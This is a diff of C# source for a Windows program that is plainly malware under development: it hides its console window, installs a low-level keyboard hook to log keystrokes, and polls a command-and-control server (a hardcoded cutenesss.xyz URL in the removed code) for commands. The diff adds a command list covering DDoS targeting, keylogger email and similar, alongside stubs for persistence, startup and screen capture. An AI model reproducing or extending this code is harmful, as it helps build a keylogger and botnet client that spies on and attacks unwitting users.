@@ -31,42 +31,28 @@ namespace Karios
 
         public static void Main()
         {
+            CommandGet();
             var handle = GetConsoleWindow();
-            using (WebClient wc = new WebClient())
-            {
-                try
-                {
-                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html"); // get rid of this cancerous website Sam -- STBoyden
-                    if (!webData.ToUpperInvariant().Contains("Keyonline"))
+           
 
-                    // Hide the window
-                    ShowWindow(handle, SW_HIDE);
+            // Hide the window
+            ShowWindow(handle, SW_HIDE);
 
-                    // Persitance feature
-                    //Duplicate(); 
+             // Persitance feature
+             //Duplicate(); 
 
-                    // Run on startup 
-                    //SetStartup();
-                    // Start Application
-                    _hookID = SetHook(_proc);
-                    Application.Run();  
-                    UnhookWindowsHookEx(_hookID);
-
-
-                    if (!webData.ToUpperInvariant().Contains("ip:"))
-                    {
-                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfgqwertyuiopasdf";
-                        string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
-                        IPTarget = IPTarget.Replace(@"</p>", "");
-                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
-                        IPTarget = GlobalTargetIP;
-                    }    
-                }
-                catch { }
-            }
+             // Run on startup 
+             //SetStartup();
+             // Start Application
+             _hookID = SetHook(_proc);
+             Application.Run();  
+             UnhookWindowsHookEx(_hookID);
+     
+            
         }
 
-        private static string CommandGet()
+
+        private static void CommandGet()
         {
             try
             {
@@ -112,69 +98,38 @@ namespace Karios
                                 paramaters = paramaters + "&newclient=false";
                         }
 
-                        //Tells the server the security hash for this version.
-                        /*
                         if (paramaters == "?")
-                            paramaters = paramaters + "hash=" + Hash;
+                            paramaters = paramaters + "ddosip=true";
                         else
-                            paramaters = paramaters + "&hash=" + Hash;
-                            */
-                        //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating.
+                            paramaters = paramaters + "&ddosip=true";
 
                         string commands = "";
                         try
                         {
                             commands = client.DownloadString(ServerAddress + paramaters);
                         }
-                        catch (WebException web)
-                        { Console.WriteLine(web); }//TODO: Handle this Exception.
+                        catch (WebException)
+                        { }//TODO: Handle this Exception.
+                        string[] PreppedCommand = commands.Split(' ');
+                        /// <summary>
+                        /// COMMANDS : IMPORTAINT : 
+                        /// 0 = Online 
+                        /// 1 = DDOSOnline
+                        /// 2 = DDOSIP
+                        /// 3 = KeyloggerOnline
+                        /// 4 = Keylogger email
+                        /// 5 = Reverse everything
+                        /// </summary>
+                        if (PreppedCommand[0] == "Online")
+                        {
+
+                        }
 
                     }
                 }
             }
             catch { }
-
-            {
-                
-                return commands;
-            }
         }
-
-
-        private static string GetCommand()
-        {
-            using (WebClient wc = new WebClient())
-            {
-                try
-                {
-                    string webData = wc.DownloadString(""); // get rid of this cancerous website Sam -- STBoyden
-                    if (!webData.ToUpperInvariant().Contains("Online"))
-                    {
-                        Online = true;
-                    }
-                    if (!webData.ToUpperInvariant().Contains("DDOS = Online"))
-                    {
-                        // Get DDOS IP
-                    }
-                    if (!webData.ToUpperInvariant().Contains("Keylogger = Online"))
-                    {
-                        // Keylogger online
-                    }
-                    if (!webData.ToUpperInvariant().Contains("Website"))
-                    {
-                        // Activate website launcher
-                    }
-                    if (!webData.ToUpperInvariant().Contains("Capture = true"))
-                    {
-                        // Activates screen capturerer & adds it to the email function
-                    }
-                }
-                catch { }
-            }
-        
-        return "gay";
-        }
-       
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -323,23 +278,19 @@ namespace Karios
                 catch { }
             }
         }
+
         public static void DDOS()
         {
             using (WebClient wc = new WebClient())
             {
                 try
                 {
-                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
-                    if (!webData.ToUpperInvariant().Contains("DDOSonline")) 
-                    {
-                        // DDOS Stuff here
-                    }
+                   
+                  
                 }
                 catch { }
             }
         }
-
-        
 
         private static Image CaptureDesktop()
         {
